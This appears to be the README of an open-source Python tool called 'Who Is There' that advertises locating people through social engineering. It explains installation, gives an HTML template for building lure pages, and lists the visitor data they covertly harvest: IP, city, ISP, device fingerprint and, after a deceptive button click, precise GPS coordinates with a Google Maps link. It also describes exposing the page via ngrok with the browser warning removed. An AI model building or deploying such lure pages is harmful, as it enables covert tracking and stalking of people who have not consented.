# **Who Is There**
## Locate peoples using python and social engineering!

#### Who Is There is an open-source beginner-friendly app for locating people using social engineering!
#### This app is **HEAVILLY** inspired by an [Seeker](https://github.com/thewhiteh4t/seeker) by [thewhiteh4t](https://github.com/thewhiteh4t).

# Update 0.0.3!

Update 0.0.3 finnaly out!


### Added:

- Printing version, page address.

- Static files.

### Changed:

- Default page to Locatly.

- On ngrok removed browser warning.

- Default structure of template.


<a href="https://github.com/tspstudio/WhoIsThere#getting-started">
    <img src="https://dabuttonfactory.com/button.png?t=Getting Started&f=Open+Sans&ts=15&tc=000&hp=25&vp=10&c=5&bgt=unicolored&bgc=099400">
</a>
<a href="https://github.com/tspstudio/WhoIsThere#advanced">
    <img src="https://dabuttonfactory.com/button.png?t=Advanced&f=Open+Sans&ts=15&tc=000&hp=25&vp=10&c=5&bgt=unicolored&bgc=099400">
</a>

## Getting Started
### Sooo... lets get started!
1. First install [Python](https://www.python.org) if you dont have it.

2. Install project using ```Code -> Download Zip``` and unzipping it, or install via ```git clone https://github.com/tspstudio/WhoIsThere```.

3. If you are running WhoIsThere on Windows, before using run ```install.bat```.
#####     If you're running it on any other OS based on Linux, run ```install.sh```.
#####     On MacOS X in terminal run ```cd WhoIsThere-main/```, and ```python3 -m pip install -r requirements.txt```

4. Done! Now run ```WhoIsThere.py``` file. It will automatically check for updates.

##### If no updates required, select a template from list and wait until it will start powerful web server based on python [Tornado](https://pypi.org/project/tornado/) framework.

##### If there's an update, go to link displayed on the screen and follow these steps above.

Flags when running WhoIsThere:

-p or --port : Run web server on selected port. Default: 8080
     
-v or --version : Print current version
     
-u or --update : Check for updates. Go [here](https://github.com/tspstudio/WhoIsThere#if-no-updates-required-select-a-template-from-list-and-wait-until-it-will-start-powerful-web-server-based-on-python-tornado-framework).

# Advanced

### How to create templates!

You want something harder? Let's create own template!

1. If you want to create template, go to ```pages\pages.json```, and add to "pages" list
```
        {
            "name": "Your template name",
            "dir": "Your template folder name"
        }
```

2. In ```pages/static``` in required folder, like ```css``` ```img``` ```js``` create folder with the same name as template.

3. In ```pages``` directory create folder with the same name as parameter ```dir``` in ```pages.json```.

4. Go into this folder and create file ```index.html```.

5. In this file paste
```
<!DOCTYPE html>
<html>
<head>
	<title>Geolocator</title>
	<link rel="stylesheet" type="text/css" 
	<script src="{{ static_url('(Your requirement name)/(Your template name)/(Your script)') }}>
	<script src="{{ static_url('locator.js') }}>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
</head>
<body onload="information();">
    <h1>If you're know some HTML, add here your elements.</h1>
    <button onclick="locate();">And edit this button but DONT REMOVE ONCLICK ARGUMENT</button>
</body>
</html>
```

Done! Now, when user visit your website, it will send you information of his device, like:

- IP Address

- Continent

- Country

- Region

- City

- Organisation

- ISP

- Platform

- Browser

- Number of CPU

- Gb of RAM

- GPU WebGL vendor

- GPU WebGL renderer

- Screen height

- Screen width

- OS

If user clicked button and accepted geolocation, it will send you

- Longitude

- Latitude

- Google Maps link

- Locator accuracy (Sometimes may be unavaliable)

- Altitude (Sometimes may be unavaliable)

- Movement direction (Sometimes may be unavaliable)

- Movement speed (Sometimes may be unavaliable)

### Setting up Who Is There!

You can set up Who Is There from ```settings.py``` file.

Go to ```settings.py``` file and edit these values:

- host : Server will run on this IP address. You can edit or delete variable and add
```
import socket
host = socket.gethostbyname(socket.gethostname())
```

- port : Server will run on this port.

- debug : If ```True```, all HTTP logs will be visible in console.

### Connecting WhoIsThere to the world!

If you want to make your page public, there's very **very** **VEERY** many ways to do it.

So, i'll show you two most popular ways.

## Way 1.

1. Install [ngrok](https://dashboard.ngrok.com/get-started/setup) and follow steps on these site.

2. Run ```ngrok http (your web server port)``` and copy link displayed on the screen.

To access your page, use copied link.

## Way 2

1. If you don't have static ip address, buy it on your internet provider.

2. Go to your router settings using [this](192.168.0.1) or [this](192.168.1.1).

If not working, search your router local ip or look bottom of your router.

3. Search how to open port on your router and do it.

4. Disable firewall on your device.

To access your page, get your public ip on [2ip.io](https://2ip.io/). Your site now on your ip.

# Have fun with Who Is There!
